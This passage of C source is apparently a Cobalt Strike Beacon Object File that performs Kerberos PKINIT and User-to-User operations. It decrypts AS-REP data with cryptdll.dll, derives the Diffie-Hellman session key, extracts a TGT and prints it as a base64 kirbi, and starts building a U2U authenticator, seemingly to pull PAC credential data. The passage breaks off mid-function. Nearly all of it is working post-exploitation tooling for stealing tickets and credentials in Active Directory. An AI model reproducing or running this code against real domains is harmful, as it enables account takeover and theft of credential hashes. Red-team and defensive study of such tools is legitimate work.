    WSACleanup();

    return response;
}

/*
 * =============================================================================
 * Kerberos Decryption using cryptdll.dll
 * =============================================================================
 */

static BYTE* KerberosDecrypt(int eType, int keyUsage, BYTE* key, int keyLen,
                              BYTE* data, int dataLen, int* outLen) {
    HMODULE hCryptDll = NULL;
    CDLocateCSystem_t pCDLocateCSystem = NULL;
    KERB_ECRYPT* pCSystem = NULL;
    void* pContext = NULL;
    BYTE* output = NULL;
    int status;
    int outputSize;
    KERB_ECRYPT_Initialize initFunc;
    KERB_ECRYPT_Decrypt decryptFunc;
    KERB_ECRYPT_Finish finishFunc;

    hCryptDll = LoadLibraryA("cryptdll.dll");
    if (!hCryptDll) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to load cryptdll.dll");
        return NULL;
    }

    pCDLocateCSystem = (CDLocateCSystem_t)GetProcAddress(hCryptDll, "CDLocateCSystem");
    if (!pCDLocateCSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to find CDLocateCSystem");
        FreeLibrary(hCryptDll);
        return NULL;
    }

    status = pCDLocateCSystem(eType, (void**)&pCSystem);
    if (status != 0 || !pCSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CDLocateCSystem failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    initFunc = (KERB_ECRYPT_Initialize)pCSystem->Initialize;
    decryptFunc = (KERB_ECRYPT_Decrypt)pCSystem->Decrypt;
    finishFunc = (KERB_ECRYPT_Finish)pCSystem->Finish;

    status = initFunc(key, keyLen, keyUsage, &pContext);
    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypt Initialize failed: 0x%X", status);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    outputSize = dataLen;
    if (dataLen % pCSystem->BlockSize != 0) {
        outputSize += pCSystem->BlockSize - (dataLen % pCSystem->BlockSize);
    }
    outputSize += pCSystem->Size;

    output = (BYTE*)malloc(outputSize);

    status = decryptFunc(pContext, data, dataLen, output, &outputSize);
    finishFunc(&pContext);

    if (status != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypt failed: 0x%X", status);
        free(output);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    *outLen = outputSize;
    FreeLibrary(hCryptDll);
    return output;
}

/*
 * =============================================================================
 * U2U - Kerberos Encryption
 * =============================================================================
 */

typedef int (WINAPI *KERB_ECRYPT_Encrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);

static BYTE* KerberosEncrypt(int eType, int keyUsage, BYTE* key, int keyLen,
                              BYTE* data, int dataLen, int* outLen) {
    HMODULE hCryptDll = NULL;
    CDLocateCSystem_t pCDLocateCSystem = NULL;
    KERB_ECRYPT* pCSystem = NULL;
    void* pContext = NULL;
    BYTE* output = NULL;
    int status;

    hCryptDll = LoadLibraryA("cryptdll.dll");
    if (!hCryptDll) return NULL;

    pCDLocateCSystem = (CDLocateCSystem_t)GetProcAddress(hCryptDll, "CDLocateCSystem");
    if (!pCDLocateCSystem) {
        FreeLibrary(hCryptDll);
        return NULL;
    }

    status = pCDLocateCSystem(eType, (void**)&pCSystem);
    if (status != 0 || !pCSystem) {
        FreeLibrary(hCryptDll);
        return NULL;
    }

    KERB_ECRYPT_Initialize initFunc = (KERB_ECRYPT_Initialize)pCSystem->Initialize;
    KERB_ECRYPT_Encrypt encryptFunc = (KERB_ECRYPT_Encrypt)pCSystem->Encrypt;
    KERB_ECRYPT_Finish finishFunc = (KERB_ECRYPT_Finish)pCSystem->Finish;

    status = initFunc(key, keyLen, keyUsage, &pContext);
    if (status != 0) {
        FreeLibrary(hCryptDll);
        return NULL;
    }

    int outputSize = dataLen + pCSystem->Size;
    output = (BYTE*)malloc(outputSize);

    status = encryptFunc(pContext, data, dataLen, output, &outputSize);
    finishFunc(&pContext);

    if (status != 0) {
        free(output);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    *outLen = outputSize;
    FreeLibrary(hCryptDll);
    return output;
}

/*
 * =============================================================================
 * U2U - Kerberos Checksum (HMAC-SHA1-96-AES256)
 * =============================================================================
 */

/* Note: KERB_CHECKSUM struct defined above */

typedef int (WINAPI *CDLocateCheckSum_t)(int type, void** ppCheckSum);
typedef int (WINAPI *KERB_CHECKSUM_InitializeEx)(BYTE* key, int keySize, int keyUsage, void** pContext);
typedef int (WINAPI *KERB_CHECKSUM_Sum)(void* pContext, int dataSize, BYTE* data);
typedef int (WINAPI *KERB_CHECKSUM_Finalize)(void* pContext, BYTE* output);
typedef int (WINAPI *KERB_CHECKSUM_Finish_t)(void** pContext);

#define KERB_CHECKSUM_HMAC_SHA1_96_AES256 16

/* Forward declaration */
static void ParsePacCredentialData(BYTE* data, int dataLen);

static BYTE* ComputeKerberosChecksum(BYTE* key, int keyLen, BYTE* data, int dataLen, int keyUsage, int* checksumLen) {
    HMODULE hCryptDll = NULL;
    CDLocateCheckSum_t pCDLocateCheckSum = NULL;
    KERB_CHECKSUM* pCheckSum = NULL;
    void* pContext = NULL;
    BYTE* output = NULL;
    int status;

    hCryptDll = LoadLibraryA("cryptdll.dll");
    if (!hCryptDll) return NULL;

    pCDLocateCheckSum = (CDLocateCheckSum_t)GetProcAddress(hCryptDll, "CDLocateCheckSum");
    if (!pCDLocateCheckSum) {
        FreeLibrary(hCryptDll);
        return NULL;
    }

    status = pCDLocateCheckSum(KERB_CHECKSUM_HMAC_SHA1_96_AES256, (void**)&pCheckSum);
    if (status != 0 || !pCheckSum) {
        FreeLibrary(hCryptDll);
        return NULL;
    }

    KERB_CHECKSUM_InitializeEx initExFunc = (KERB_CHECKSUM_InitializeEx)pCheckSum->InitializeEx;
    KERB_CHECKSUM_Sum sumFunc = (KERB_CHECKSUM_Sum)pCheckSum->Sum;
    KERB_CHECKSUM_Finalize finalizeFunc = (KERB_CHECKSUM_Finalize)pCheckSum->Finalize;
    KERB_CHECKSUM_Finish_t finishFunc = (KERB_CHECKSUM_Finish_t)pCheckSum->Finish;

    status = initExFunc(key, keyLen, keyUsage, &pContext);
    if (status != 0) {
        FreeLibrary(hCryptDll);
        return NULL;
    }

    status = sumFunc(pContext, dataLen, data);
    if (status != 0) {
        finishFunc(&pContext);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    *checksumLen = pCheckSum->Size;
    output = (BYTE*)malloc(*checksumLen);
    status = finalizeFunc(pContext, output);
    finishFunc(&pContext);

    if (status != 0) {
        free(output);
        FreeLibrary(hCryptDll);
        return NULL;
    }

    FreeLibrary(hCryptDll);
    return output;
}

/*
 * =============================================================================
 * kTruncate Key Derivation (RFC 4556 Section 3.2.3.1)
 * =============================================================================
 */

/* kTruncate function - RFC 4556 Section 3.2.3.1 */
static void KTruncate(int k, BYTE* x, int xLen, BYTE* result) {
    int offset = 0;
    BYTE counter = 0;
    BYTE* toHash = (BYTE*)malloc(1 + xLen);

    while (offset < k) {
        BYTE hash[20];
        int copyLen;

        /* Hash = SHA1(counter || x) */
        toHash[0] = counter;
        memcpy(toHash + 1, x, xLen);
        ComputeSha1(toHash, 1 + xLen, hash);

        /* Copy hash bytes to result */
        copyLen = (k - offset < 20) ? (k - offset) : 20;
        memcpy(result + offset, hash, copyLen);
        offset += copyLen;
        counter++;
    }

    free(toHash);
}

/* Derive session key from DH shared secret (RFC 4556) */
static void DeriveSessionKey(BYTE* sharedSecret, int secretLen, BYTE* serverNonce, int nonceLen, BYTE* sessionKey, int keyLen) {
    /* x = Z || server_nonce (client nonce is empty per Rubeus/RFC) */
    int xLen = secretLen + nonceLen;
    BYTE* x = (BYTE*)malloc(xLen);

    memcpy(x, sharedSecret, secretLen);
    if (nonceLen > 0 && serverNonce) {
        memcpy(x + secretLen, serverNonce, nonceLen);
    }

    /* Apply kTruncate */
    KTruncate(keyLen, x, xLen, sessionKey);

    free(x);
}

/*
 * =============================================================================
 * AS-REP Parsing - Extract KDC DH Public Key
 * =============================================================================
 */

static BYTE* ExtractKdcDhPublicKey(BYTE* asRep, int asRepLen, int* keyLen) {
    int i;
    /* DH OID pattern: 1.2.840.10046.2.1 = 2A 86 48 CE 3E 02 01 */
    BYTE dhOidPattern[] = { 0x2A, 0x86, 0x48, 0xCE, 0x3E, 0x02, 0x01 };

    *keyLen = 0;

    /* Search for DH OID in response */
    for (i = 0; i < asRepLen - (int)sizeof(dhOidPattern) - 10; i++) {
        int j, found = 1;
        for (j = 0; j < (int)sizeof(dhOidPattern); j++) {
            if (asRep[i + j] != dhOidPattern[j]) {
                found = 0;
                break;
            }
        }

        if (found) {
            /* Found DH OID, now search for large INTEGER (~128 bytes) */
            int searchStart = i + sizeof(dhOidPattern);
            int searchEnd = (searchStart + 500 < asRepLen) ? searchStart + 500 : asRepLen - 10;

            for (j = searchStart; j < searchEnd; j++) {
                if (asRep[j] == 0x02) { /* INTEGER tag */
                    int len = 0;
                    int lenBytes = 1;
                    int dataOffset;

                    if ((asRep[j + 1] & 0x80) != 0) {
                        lenBytes = (asRep[j + 1] & 0x7F) + 1;
                        int k;
                        for (k = 1; k < lenBytes; k++) {
                            len = (len << 8) | asRep[j + 1 + k];
                        }
                    } else {
                        len = asRep[j + 1];
                    }

                    dataOffset = j + 1 + lenBytes;

                    /* Looking for ~128 byte integer (DH public key) */
                    if (len >= 120 && len <= 140) {
                        BYTE* result = (BYTE*)malloc(128);
                        BYTE* intData = asRep + dataOffset;
                        int copyLen = len;
                        int destOffset = 0;

                        /* Skip leading zero if present */
                        if (intData[0] == 0 && copyLen > 1) {
                            intData++;
                            copyLen--;
                        }

                        /* Pad to 128 bytes */
                        memset(result, 0, 128);
                        destOffset = 128 - copyLen;
                        if (destOffset < 0) destOffset = 0;
                        memcpy(result + destOffset, intData, (copyLen > 128) ? 128 : copyLen);

                        *keyLen = 128;
                        return result;
                    }
                }
            }
        }
    }

    /* Fallback: Search for any large INTEGER that could be the DH public key */
    for (i = 0; i < asRepLen - 140; i++) {
        if (asRep[i] == 0x02) { /* INTEGER tag */
            int len = 0;
            int lenBytes = 1;
            int dataOffset;

            if ((asRep[i + 1] & 0x80) != 0) {
                lenBytes = (asRep[i + 1] & 0x7F) + 1;
                int k;
                for (k = 1; k < lenBytes; k++) {
                    len = (len << 8) | asRep[i + 1 + k];
                }
            } else {
                len = asRep[i + 1];
            }

            dataOffset = i + 1 + lenBytes;

            if (len >= 127 && len <= 130 && dataOffset + len <= asRepLen) {
                BYTE* result = (BYTE*)malloc(128);
                BYTE* intData = asRep + dataOffset;
                int copyLen = len;
                int destOffset = 0;

                if (intData[0] == 0 && copyLen > 1) {
                    intData++;
                    copyLen--;
                }

                memset(result, 0, 128);
                destOffset = 128 - copyLen;
                if (destOffset < 0) destOffset = 0;
                memcpy(result + destOffset, intData, (copyLen > 128) ? 128 : copyLen);

                *keyLen = 128;
                return result;
            }
        }
    }

    return NULL;
}

/*
 * =============================================================================
 * AS-REP Parsing - Extract Server DH Nonce
 * =============================================================================
 */

static BYTE* ExtractServerDhNonce(BYTE* asRep, int asRepLen, int* nonceLen) {
    int i;
    *nonceLen = 0;

    /* Search for 32-byte OCTET STRING that could be server nonce */
    for (i = 0; i < asRepLen - 34; i++) {
        if (asRep[i] == 0x04 && asRep[i + 1] == 0x20) { /* OCTET STRING of 32 bytes */
            BYTE* candidate = asRep + i + 2;
            int j, hasVariation = 0, allZero = 1;

            for (j = 1; j < 32; j++) {
                if (candidate[j] != candidate[0]) hasVariation = 1;
                if (candidate[j] != 0) allZero = 0;
            }

            if (hasVariation && !allZero) {
                BYTE* result = (BYTE*)malloc(32);
                memcpy(result, candidate, 32);
                *nonceLen = 32;
                return result;
            }
        }
    }

    /* Not found - return NULL (nonce is optional) */
    return NULL;
}

/*
 * =============================================================================
 * AS-REP Parsing - Extract enc-part
 * =============================================================================
 */

static BYTE* ExtractEncPartFromAsRep(BYTE* asRep, int asRepLen, int* outLen) {
    int i;
    *outLen = 0;

    /* Find enc-part [6] */
    for (i = 0; i < asRepLen - 10; i++) {
        if (asRep[i] == 0xA6) { /* [6] enc-part */
            int encPartLen;
            int lenBytes = DecodeLength(asRep, i+1, &encPartLen);
            int seqStart = i + 1 + lenBytes;

            if (seqStart < asRepLen && asRep[seqStart] == 0x30) {
                /* Find cipher [2] */
                int j;
                for (j = seqStart + 2; j < seqStart + encPartLen - 5; j++) {
                    if (asRep[j] == 0xA2) { /* [2] cipher */
                        int cipherTagLen;
                        int cipherLenBytes = DecodeLength(asRep, j+1, &cipherTagLen);
                        int octetStart = j + 1 + cipherLenBytes;

                        if (octetStart < asRepLen && asRep[octetStart] == 0x04) {
                            int octetLen;
                            int octetLenBytes = DecodeLength(asRep, octetStart+1, &octetLen);

                            *outLen = octetLen;
                            BYTE* cipher = (BYTE*)malloc(octetLen);
                            memcpy(cipher, asRep + octetStart + 1 + octetLenBytes, octetLen);
                            return cipher;
                        }
                    }
                }
            }
        }
    }

    return NULL;
}

/*
 * =============================================================================
 * Extract Session Key from Decrypted EncASRepPart
 * =============================================================================
 */

static BYTE* ExtractSessionKey(BYTE* decrypted, int decryptedLen, int* keyLen, int* keyType) {
    int i;
    *keyLen = 0;
    *keyType = 0;

    /* Find key [0] EncryptionKey { keytype [0], keyvalue [1] } */
    for (i = 0; i < decryptedLen - 10; i++) {
        if (decrypted[i] == 0xA0) { /* [0] key */
            int j;
            for (j = i + 2; j < decryptedLen - 5; j++) {
                if (decrypted[j] == 0xA0 && decrypted[j+2] == 0x02) { /* etype */
                    *keyType = decrypted[j+4];
                }
                if (decrypted[j] == 0xA1) { /* [1] keyvalue */
                    int keyTagLen;
                    int keyLenBytes = DecodeLength(decrypted, j+1, &keyTagLen);
                    int octetStart = j + 1 + keyLenBytes;

                    if (octetStart < decryptedLen && decrypted[octetStart] == 0x04) {
                        int octetLen;
                        int octetLenBytes = DecodeLength(decrypted, octetStart+1, &octetLen);

                        *keyLen = octetLen;
                        BYTE* key = (BYTE*)malloc(octetLen);
                        memcpy(key, decrypted + octetStart + 1 + octetLenBytes, octetLen);
                        return key;
                    }
                }
            }
        }
    }

    return NULL;
}

/*
 * =============================================================================
 * Extract TGT from AS-REP
 * =============================================================================
 */

static BYTE* ExtractTicketFromAsRep(BYTE* asRep, int asRepLen, int* outLen) {
    int offset = 0;
    int length;
    *outLen = 0;

    /* Skip APPLICATION 11 tag */
    if (asRep[offset] == 0x6B) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Skip outer SEQUENCE */
    if (asRep[offset] == 0x30) {
        offset++;
        offset += DecodeLength(asRep, offset, &length);
    }

    /* Find ticket [5] */
    while (offset < asRepLen - 10) {
        if (asRep[offset] == 0xA5) {
            offset++;
            offset += DecodeLength(asRep, offset, &length);

            /* The ticket starts here (APPLICATION 1) */
            *outLen = length;
            BYTE* ticket = (BYTE*)malloc(length);
            memcpy(ticket, asRep + offset, length);
            return ticket;
        } else if ((asRep[offset] & 0xE0) == 0xA0) {
            offset++;
            int skipLen;
            offset += DecodeLength(asRep, offset, &skipLen);
            offset += skipLen;
        } else {
            offset++;
        }
    }

    return NULL;
}

/*
 * =============================================================================
 * KRB-CRED (kirbi) Builder - Rubeus compatible output
 * =============================================================================
 */

static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessionKeyLen,
                        int encType, const char* user, const char* realm) {
    /*
     * Build minimal KRB-CRED structure for TGT export
     * KRB-CRED ::= [APPLICATION 22] SEQUENCE {
     *   pvno [0] INTEGER (5),
     *   msg-type [1] INTEGER (22),
     *   tickets [2] SEQUENCE OF Ticket,
     *   enc-part [3] EncryptedData { etype 0, cipher: EncKrbCredPart }
     * }
     */
    BYTE* kirbi = (BYTE*)malloc(ticketLen + sessionKeyLen + 1024);
    int kOffset = 0;
    char* b64 = NULL;
    DWORD b64Len = 0;

    /* Build KrbCredInfo */
    BYTE* credInfo = (BYTE*)malloc(sessionKeyLen + 512);
    int ciOffset = 0;

    /* key [0] EncryptionKey { etype [0], keyvalue [1] } */
    BYTE keyContent[64];
    int keyOffset = 0;
    /* etype */
    keyContent[keyOffset++] = 0xA0;
    keyContent[keyOffset++] = 0x03;
    keyContent[keyOffset++] = 0x02;
    keyContent[keyOffset++] = 0x01;
    keyContent[keyOffset++] = (BYTE)encType;
    /* keyvalue */
    keyContent[keyOffset++] = 0xA1;
    keyContent[keyOffset++] = (BYTE)(sessionKeyLen + 2);
    keyContent[keyOffset++] = 0x04;
    keyContent[keyOffset++] = (BYTE)sessionKeyLen;
    memcpy(keyContent + keyOffset, sessionKey, sessionKeyLen);
    keyOffset += sessionKeyLen;

    credInfo[ciOffset++] = 0xA0; /* [0] key */
    credInfo[ciOffset++] = (BYTE)(keyOffset + 2);
    credInfo[ciOffset++] = 0x30;
    credInfo[ciOffset++] = (BYTE)keyOffset;
    memcpy(credInfo + ciOffset, keyContent, keyOffset);
    ciOffset += keyOffset;

    /* prealm [1] */
    int realmLen = (int)strlen(realm);
    credInfo[ciOffset++] = 0xA1;
    credInfo[ciOffset++] = (BYTE)(realmLen + 2);
    credInfo[ciOffset++] = 0x1B; /* GeneralString */
    credInfo[ciOffset++] = (BYTE)realmLen;
    memcpy(credInfo + ciOffset, realm, realmLen);
    ciOffset += realmLen;

    /* pname [2] PrincipalName { name-type [0] = 1, name-string [1] } */
    int userLen = (int)strlen(user);
    BYTE pnameContent[128];
    int pnOffset = 0;
    pnameContent[pnOffset++] = 0xA0;
    pnameContent[pnOffset++] = 0x03;
    pnameContent[pnOffset++] = 0x02;
    pnameContent[pnOffset++] = 0x01;
    pnameContent[pnOffset++] = 0x01; /* NT-PRINCIPAL */
    pnameContent[pnOffset++] = 0xA1;
    pnameContent[pnOffset++] = (BYTE)(userLen + 4);
    pnameContent[pnOffset++] = 0x30;
    pnameContent[pnOffset++] = (BYTE)(userLen + 2);
    pnameContent[pnOffset++] = 0x1B;
    pnameContent[pnOffset++] = (BYTE)userLen;
    memcpy(pnameContent + pnOffset, user, userLen);
    pnOffset += userLen;

    credInfo[ciOffset++] = 0xA2;
    credInfo[ciOffset++] = (BYTE)(pnOffset + 2);
    credInfo[ciOffset++] = 0x30;
    credInfo[ciOffset++] = (BYTE)pnOffset;
    memcpy(credInfo + ciOffset, pnameContent, pnOffset);
    ciOffset += pnOffset;

    /* srealm [8] */
    credInfo[ciOffset++] = 0xA8;
    credInfo[ciOffset++] = (BYTE)(realmLen + 2);
    credInfo[ciOffset++] = 0x1B;
    credInfo[ciOffset++] = (BYTE)realmLen;
    memcpy(credInfo + ciOffset, realm, realmLen);
    ciOffset += realmLen;

    /* sname [9] krbtgt/REALM */
    BYTE snameContent[128];
    int snOffset = 0;
    snameContent[snOffset++] = 0xA0;
    snameContent[snOffset++] = 0x03;
    snameContent[snOffset++] = 0x02;
    snameContent[snOffset++] = 0x01;
    snameContent[snOffset++] = 0x02; /* NT-SRV-INST */
    snameContent[snOffset++] = 0xA1;
    snameContent[snOffset++] = (BYTE)(6 + 2 + realmLen + 2 + 2);
    snameContent[snOffset++] = 0x30;
    snameContent[snOffset++] = (BYTE)(6 + 2 + realmLen + 2);
    snameContent[snOffset++] = 0x1B;
    snameContent[snOffset++] = 0x06;
    memcpy(snameContent + snOffset, "krbtgt", 6);
    snOffset += 6;
    snameContent[snOffset++] = 0x1B;
    snameContent[snOffset++] = (BYTE)realmLen;
    memcpy(snameContent + snOffset, realm, realmLen);
    snOffset += realmLen;

    credInfo[ciOffset++] = 0xA9;
    credInfo[ciOffset++] = (BYTE)(snOffset + 2);
    credInfo[ciOffset++] = 0x30;
    credInfo[ciOffset++] = (BYTE)snOffset;
    memcpy(credInfo + ciOffset, snameContent, snOffset);
    ciOffset += snOffset;

    /* Build EncKrbCredPart [APPLICATION 29] */
    BYTE* encCredPart = (BYTE*)malloc(ciOffset + 64);
    int ecpOffset = 0;
    /* ticket-info [0] SEQUENCE OF KrbCredInfo */
    encCredPart[ecpOffset++] = 0xA0;
    int seqLen = ciOffset + 2;
    if (seqLen < 128) {
        encCredPart[ecpOffset++] = (BYTE)seqLen;
    } else {
        encCredPart[ecpOffset++] = 0x82;
        encCredPart[ecpOffset++] = (BYTE)(seqLen >> 8);
        encCredPart[ecpOffset++] = (BYTE)(seqLen & 0xFF);
    }
    encCredPart[ecpOffset++] = 0x30; /* SEQUENCE OF */
    if (ciOffset < 128) {
        encCredPart[ecpOffset++] = (BYTE)ciOffset;
    } else {
        encCredPart[ecpOffset++] = 0x82;
        encCredPart[ecpOffset++] = (BYTE)(ciOffset >> 8);
        encCredPart[ecpOffset++] = (BYTE)(ciOffset & 0xFF);
    }
    /* KrbCredInfo SEQUENCE */
    encCredPart[ecpOffset++] = 0x30;
    if (ciOffset < 128) {
        encCredPart[ecpOffset++] = (BYTE)ciOffset;
    } else {
        encCredPart[ecpOffset++] = 0x82;
        encCredPart[ecpOffset++] = (BYTE)(ciOffset >> 8);
        encCredPart[ecpOffset++] = (BYTE)(ciOffset & 0xFF);
    }
    memcpy(encCredPart + ecpOffset, credInfo, ciOffset);
    ecpOffset += ciOffset;

    /* Wrap in [APPLICATION 29] */
    BYTE* app29 = (BYTE*)malloc(ecpOffset + 8);
    int a29Offset = 0;
    app29[a29Offset++] = 0x7D; /* [APPLICATION 29] */
    if (ecpOffset + 2 < 128) {
        app29[a29Offset++] = (BYTE)(ecpOffset + 2);
    } else {
        app29[a29Offset++] = 0x82;
        app29[a29Offset++] = (BYTE)((ecpOffset + 2) >> 8);
        app29[a29Offset++] = (BYTE)((ecpOffset + 2) & 0xFF);
    }
    app29[a29Offset++] = 0x30;
    if (ecpOffset < 128) {
        app29[a29Offset++] = (BYTE)ecpOffset;
    } else {
        app29[a29Offset++] = 0x82;
        app29[a29Offset++] = (BYTE)(ecpOffset >> 8);
        app29[a29Offset++] = (BYTE)(ecpOffset & 0xFF);
    }
    memcpy(app29 + a29Offset, encCredPart, ecpOffset);
    a29Offset += ecpOffset;

    /* Build enc-part EncryptedData { etype [0] = 0, cipher [2] } */
    BYTE* encPart = (BYTE*)malloc(a29Offset + 32);
    int epOffset = 0;
    /* etype [0] INTEGER 0 */
    encPart[epOffset++] = 0xA0;
    encPart[epOffset++] = 0x03;
    encPart[epOffset++] = 0x02;
    encPart[epOffset++] = 0x01;
    encPart[epOffset++] = 0x00;
    /* cipher [2] OCTET STRING */
    encPart[epOffset++] = 0xA2;
    if (a29Offset + 2 < 128) {
        encPart[epOffset++] = (BYTE)(a29Offset + 2);
    } else {
        encPart[epOffset++] = 0x82;
        encPart[epOffset++] = (BYTE)((a29Offset + 2) >> 8);
        encPart[epOffset++] = (BYTE)((a29Offset + 2) & 0xFF);
    }
    encPart[epOffset++] = 0x04;
    if (a29Offset < 128) {
        encPart[epOffset++] = (BYTE)a29Offset;
    } else {
        encPart[epOffset++] = 0x82;
        encPart[epOffset++] = (BYTE)(a29Offset >> 8);
        encPart[epOffset++] = (BYTE)(a29Offset & 0xFF);
    }
    memcpy(encPart + epOffset, app29, a29Offset);
    epOffset += a29Offset;

    /* Wrap enc-part in SEQUENCE */
    BYTE* encPartSeq = (BYTE*)malloc(epOffset + 8);
    int epsOffset = 0;
    encPartSeq[epsOffset++] = 0x30;
    if (epOffset < 128) {
        encPartSeq[epsOffset++] = (BYTE)epOffset;
    } else {
        encPartSeq[epsOffset++] = 0x82;
        encPartSeq[epsOffset++] = (BYTE)(epOffset >> 8);
        encPartSeq[epsOffset++] = (BYTE)(epOffset & 0xFF);
    }
    memcpy(encPartSeq + epsOffset, encPart, epOffset);
    epsOffset += epOffset;

    /* Build KRB-CRED body */
    /* pvno [0] INTEGER 5 */
    kirbi[kOffset++] = 0xA0;
    kirbi[kOffset++] = 0x03;
    kirbi[kOffset++] = 0x02;
    kirbi[kOffset++] = 0x01;
    kirbi[kOffset++] = 0x05;
    /* msg-type [1] INTEGER 22 */
    kirbi[kOffset++] = 0xA1;
    kirbi[kOffset++] = 0x03;
    kirbi[kOffset++] = 0x02;
    kirbi[kOffset++] = 0x01;
    kirbi[kOffset++] = 0x16;
    /* tickets [2] SEQUENCE OF Ticket */
    kirbi[kOffset++] = 0xA2;
    if (ticketLen + 2 < 128) {
        kirbi[kOffset++] = (BYTE)(ticketLen + 2);
    } else {
        kirbi[kOffset++] = 0x82;
        kirbi[kOffset++] = (BYTE)((ticketLen + 2) >> 8);
        kirbi[kOffset++] = (BYTE)((ticketLen + 2) & 0xFF);
    }
    kirbi[kOffset++] = 0x30;
    if (ticketLen < 128) {
        kirbi[kOffset++] = (BYTE)ticketLen;
    } else {
        kirbi[kOffset++] = 0x82;
        kirbi[kOffset++] = (BYTE)(ticketLen >> 8);
        kirbi[kOffset++] = (BYTE)(ticketLen & 0xFF);
    }
    memcpy(kirbi + kOffset, ticket, ticketLen);
    kOffset += ticketLen;
    /* enc-part [3] */
    kirbi[kOffset++] = 0xA3;
    if (epsOffset < 128) {
        kirbi[kOffset++] = (BYTE)epsOffset;
    } else {
        kirbi[kOffset++] = 0x82;
        kirbi[kOffset++] = (BYTE)(epsOffset >> 8);
        kirbi[kOffset++] = (BYTE)(epsOffset & 0xFF);
    }
    memcpy(kirbi + kOffset, encPartSeq, epsOffset);
    kOffset += epsOffset;

    /* Wrap in SEQUENCE and [APPLICATION 22] */
    BYTE* final = (BYTE*)malloc(kOffset + 16);
    int fOffset = 0;
    final[fOffset++] = 0x76; /* [APPLICATION 22] */
    if (kOffset + 2 < 128) {
        final[fOffset++] = (BYTE)(kOffset + 2);
    } else {
        final[fOffset++] = 0x82;
        final[fOffset++] = (BYTE)((kOffset + 2) >> 8);
        final[fOffset++] = (BYTE)((kOffset + 2) & 0xFF);
    }
    final[fOffset++] = 0x30;
    if (kOffset < 128) {
        final[fOffset++] = (BYTE)kOffset;
    } else {
        final[fOffset++] = 0x82;
        final[fOffset++] = (BYTE)(kOffset >> 8);
        final[fOffset++] = (BYTE)(kOffset & 0xFF);
    }
    memcpy(final + fOffset, kirbi, kOffset);
    fOffset += kOffset;

    /* Convert to base64 */
    CryptBinaryToStringA(final, fOffset, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
    b64 = (char*)malloc(b64Len + 1);
    CryptBinaryToStringA(final, fOffset, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64, &b64Len);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] TGT (kirbi, base64):");
    BeaconPrintf(CALLBACK_OUTPUT, "%s", b64);

    free(b64);
    free(final);
    free(kirbi);
    free(credInfo);
    free(encCredPart);
    free(app29);
    free(encPart);
    free(encPartSeq);
}

/*
 * =============================================================================
 * U2U - Build TGS-REQ Structures
 * =============================================================================
 */

/* Build U2U Authenticator */
static BYTE* BuildU2UAuthenticator(const char* user, const char* realm, BYTE* sessionKey, int sessionKeyLen,
                                    BYTE* reqBody, int reqBodyLen, int* outLen) {
    BYTE* authContent = (BYTE*)malloc(4096);
    int offset = 0;

    /* authenticator-vno [0] INTEGER 5 */
    int vnoLen;
    BYTE* vno = BuildInteger(5, &vnoLen);
    int vnoTagLen;
    BYTE* vnoTag = BuildContextTag(0, vno, vnoLen, &vnoTagLen);
    memcpy(authContent + offset, vnoTag, vnoTagLen);
    offset += vnoTagLen;
    free(vno);
    free(vnoTag);

    /* crealm [1] GeneralString */
    int realmStrLen;
    BYTE* realmStr = BuildGeneralString(realm, &realmStrLen);
    int realmTagLen;
    BYTE* realmTag = BuildContextTag(1, realmStr, realmStrLen, &realmTagLen);
    memcpy(authContent + offset, realmTag, realmTagLen);
    offset += realmTagLen;
    free(realmStr);
    free(realmTag);

    /* cname [2] PrincipalName */
    int cnameLen;
    BYTE* cname = BuildPrincipalName(1, user, NULL, &cnameLen);
    int cnameTagLen;
    BYTE* cnameTag = BuildContextTag(2, cname, cnameLen, &cnameTagLen);
    memcpy(authContent + offset, cnameTag, cnameTagLen);
    offset += cnameTagLen;
    free(cname);
    free(cnameTag);

    /* cksum [3] Checksum - checksum of req-body */
    int checksumValueLen;
    BYTE* checksumValue = ComputeKerberosChecksum(sessionKey, sessionKeyLen, reqBody, reqBodyLen,
                                                   KRB_KEY_USAGE_TGS_REQ_AUTH_CKSUM, &checksumValueLen);
    if (checksumValue) {
        BYTE cksumContent[64];
        int cksumOffset = 0;

        /* cksumtype [0] INTEGER 16 */
        int ctypeLen;
        BYTE* ctype = BuildInteger(KERB_CHECKSUM_HMAC_SHA1_96_AES256, &ctypeLen);
        int ctypeTagLen;
        BYTE* ctypeTag = BuildContextTag(0, ctype, ctypeLen, &ctypeTagLen);
        memcpy(cksumContent + cksumOffset, ctypeTag, ctypeTagLen);
        cksumOffset += ctypeTagLen;
        free(ctype);
        free(ctypeTag);

        /* checksum [1] OCTET STRING */
        int cvalLen;
        BYTE* cval = BuildOctetString(checksumValue, checksumValueLen, &cvalLen);
        int cvalTagLen;
        BYTE* cvalTag = BuildContextTag(1, cval, cvalLen, &cvalTagLen);
        memcpy(cksumContent + cksumOffset, cvalTag, cvalTagLen);
        cksumOffset += cvalTagLen;
        free(cval);
        free(cvalTag);
        free(checksumValue);

        int cksumSeqLen;
        BYTE* cksumSeq = BuildSequence(cksumContent, cksumOffset, &cksumSeqLen);
        int cksumTagLen;
        BYTE* cksumTag = BuildContextTag(3, cksumSeq, cksumSeqLen, &cksumTagLen);
        memcpy(authContent + offset, cksumTag, cksumTagLen);
        offset += cksumTagLen;
        free(cksumSeq);
        free(cksumTag);
    }

    /* cusec [4] Microseconds */
    SYSTEMTIME st;
    GetSystemTime(&st);
    int cusec = st.wMilliseconds * 1000;
    int cusecLen;
    BYTE* cusecInt = BuildInteger(cusec, &cusecLen);
    int cusecTagLen;
    BYTE* cusecTag = BuildContextTag(4, cusecInt, cusecLen, &cusecTagLen);
